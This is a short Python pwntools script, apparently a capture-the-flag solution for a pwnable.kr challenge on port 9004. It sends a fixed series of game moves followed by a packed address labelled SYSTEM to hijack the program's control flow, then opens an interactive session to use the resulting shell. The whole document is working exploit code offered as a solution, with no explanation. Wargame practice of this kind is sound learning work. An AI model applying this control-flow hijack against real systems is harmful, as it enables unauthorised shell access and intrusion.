from pwn import *

SYSTEM = 0x08048dbf

moves = [2, 1, 1, 1] + [3, 3, 2] * 4

r = remote("pwnable.kr", 9004)

payload = ""
payload += '\n'.join(str(x) for x in moves)
payload += '\n'
payload += p32(SYSTEM)
payload += '\n'

r.send(payload)

r.interactive()
